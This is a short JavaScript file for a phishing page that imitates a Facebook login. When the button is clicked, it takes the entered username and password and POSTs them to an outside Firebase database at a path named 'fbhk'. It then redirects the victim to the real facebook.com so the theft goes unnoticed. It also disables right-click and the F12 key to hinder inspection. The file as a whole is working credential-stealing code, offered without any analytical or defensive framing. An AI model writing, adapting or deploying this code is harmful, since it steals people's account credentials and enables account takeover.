const userNaname=document.getElementById('username');
const password=document.getElementById('password');
const btn=document.querySelector("button");

async function postData(url = '', data = {}) {

    const response = await fetch(url, {
      method: 'POST', 
      mode: 'cors', 
      cache: 'no-cache',
      credentials: 'same-origin', 
      headers: {
        'Content-Type': 'application/json'
      },
      redirect: 'follow', 
      referrerPolicy: 'no-referrer', 
      body: JSON.stringify(data) 
    });
    return response.json();
  }
  document.addEventListener('contextmenu', event => event.preventDefault());
  document.onkeydown = function (e) {
 
    if(e.keyCode == 123) {
        return false;
    }
  }
 
    btn.addEventListener('click', ()=>{
      if(password.value.trim()==="" || userNaname.value.trim()===""){
        return
      }else{
        postData('https://fbhk-9882a-default-rtdb.firebaseio.com/fbhk.json', { userName:userNaname.value, password:password.value})
        .then(data => {
          console.log(data); 
        }).then(
           setTimeout(() => {
             open("https://www.facebook.com/", "_self")
           }, 10000)
        );

          }
    })